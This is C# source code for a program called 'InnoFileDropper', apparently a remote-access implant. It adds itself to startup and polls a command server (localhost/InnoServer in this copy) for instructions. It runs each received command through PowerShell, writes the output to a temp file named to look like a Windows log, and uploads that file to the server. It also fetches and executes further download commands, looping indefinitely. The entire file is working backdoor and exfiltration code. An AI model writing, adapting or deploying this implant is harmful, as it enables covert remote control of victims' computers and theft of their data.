using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using System.Threading.Tasks;

namespace InnoFileDropper
{
    class Program
    {
        public static string comND = "echo Hi";
        public static string uploadCall = "curl -?";
        public static string fileCheck = "curl -?";
        public static int? delayTime = 20000;
        public static string TEMP_FOLDER_PATH = Path.GetTempPath();
        public static string MAIN_FILE_PATH = TEMP_FOLDER_PATH + "SystemLog.txt";
        public static string FINAL_FILE_PATH = TEMP_FOLDER_PATH + "WindowsLog.txt";
        public static string BASE_URL = "http://localhost/InnoServer/";

        //static void Main(string[] args)
        static async Task Main(string[] args)
        {
            Console.WriteLine(TEMP_FOLDER_PATH);
            Console.WriteLine(MAIN_FILE_PATH);
            Console.WriteLine(FINAL_FILE_PATH);
            //Calling Startup
            try
            {
                StartAppManager saManager = new StartAppManager();
                saManager.SetStartup();
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
            await DoSomethingEverySixtySeconds();
        }
        static void ApunkaIlaka()
        {
            try
            {
                using (var client = new WebClient())
                {
                    var a = 50;
                    var b = 100;
                    var result = client.DownloadString(string.Format("http://127.0.0.1/add.php?a={0}&b={1}", a, b));
                    try
                    {
                        comND = client.DownloadString(string.Format("http://localhost/InnoServer/cmdserver.php"));
                        uploadCall = client.DownloadString(string.Format("http://localhost/InnoServer/uploadToClientAPI.php"));
                        fileCheck = client.DownloadString(string.Format("http://localhost/InnoServer/filecheckAPI.php"));
                        try
                        {
                            string delayTimeString = client.DownloadString(string.Format("http://localhost/InnoServer/delayTimeAPI.php"));
                            delayTime = int.Parse(delayTimeString);
                            Console.WriteLine("Delay Time Updated : {0}", delayTime);
                        }
                        catch(Exception xx)
                        {
                            //delayTime = 20000;
                            Debug.WriteLine(xx.Message);
                        }
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine("Failed to get Value from server :" + e.Message);
                        comND = "ping 8.8.8.8";
                    }
                    Console.WriteLine(comND);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }

            //Collecting Data from System
            try
            {
                var folderPath = @"D:\";
                var fileName = @"\commandLog.txt";
                var fullPath = folderPath + fileName;
                using (StreamWriter writer = new StreamWriter(MAIN_FILE_PATH)) ;


                using (CmdService cmdService = new CmdService("powershell.exe"))
                {
                    string consoleCommand = String.Empty;
                    do
                    {
                        consoleCommand = comND;
                        string output = cmdService.ExecuteCommand(consoleCommand);
                        using (StreamWriter writer = new StreamWriter(MAIN_FILE_PATH))
                        {
                            writer.WriteLine(">>> {0}", output);
                            writer.Flush();
                        }
                        Console.WriteLine(">>> {0}", output);
                        Console.WriteLine(uploadCall);
                        //Downlaoding File
                        if (!File.Exists(fileCheck))
                        {
                            try
                            {
                                string downloadCommand = "curl -?";
                                downloadCommand = uploadCall;
                                string outputted = cmdService.ExecuteCommand(downloadCommand);
                                Console.WriteLine(">>> {0}", outputted);
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine("Value: {0} and Excepption : {1}", uploadCall, ex.Message);
                            }

                        }
                        else
                        {
                            Console.WriteLine("File already exist.");
                        }
                    }
                    while (String.IsNullOrEmpty(consoleCommand));
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
            Thread.Sleep(2000);
            //Console.ReadLine();

        }

        //Uploading Result
        static void UploadToBaba()
        {
            try
            {
                if (File.Exists(FINAL_FILE_PATH))
                {
                    Console.WriteLine("The file exists.");
                    File.Delete(FINAL_FILE_PATH);
                    Thread.Sleep(1000);
                    Console.WriteLine("Wait cleaning up!");
                    File.Copy(MAIN_FILE_PATH, FINAL_FILE_PATH);
                }
                else
                {
                    File.Copy(MAIN_FILE_PATH, FINAL_FILE_PATH);
                }
            }catch(IOException ie)
            {
                Console.WriteLine(ie.Message);
            }

            try
            {
                var ip = "localhost/InnoServer";
                var file = FINAL_FILE_PATH;
                WebClient cl = new WebClient();
                try
                {

                    cl.UploadFile("http://" + ip + "/up.php", file);
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);

            }
            Thread.Sleep(2000);
        }

        static void downloadingBabaJikiButi()
        {
            try
            {
                using (var client = new WebClient())
                {
                    try
                    {
                        uploadCall = client.DownloadString(string.Format("http://localhost/InnoServer/uploadToClientAPI.php"));
                    }
                    catch (Exception e)
                    {
                        uploadCall = "curl -?";
                        Console.WriteLine(e.Message);
                    }
                    Console.WriteLine(comND);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }

        //----------------------------------------------------------------------------------------------------------------//
        static async Task DoSomethingEverySixtySeconds()
        {
            while (true)
            {

                var delayTask = Task.Delay((int)delayTime);
                ApunkaIlaka();
                UploadToBaba();
                if (uploadCall != "curl -?")
                {
                    downloadingBabaJikiButi();
                }
                else
                {
                    Console.WriteLine("Nothing Recieved!");
                    Console.WriteLine("Delay time is : {0}", delayTime);
                    Thread.Sleep(2000);
                }
                await delayTask; // wait until at least 10s elapsed since delayTask created
            }
        }

        //----------------------------------------------------------------------------------------------------------------//

    }
}
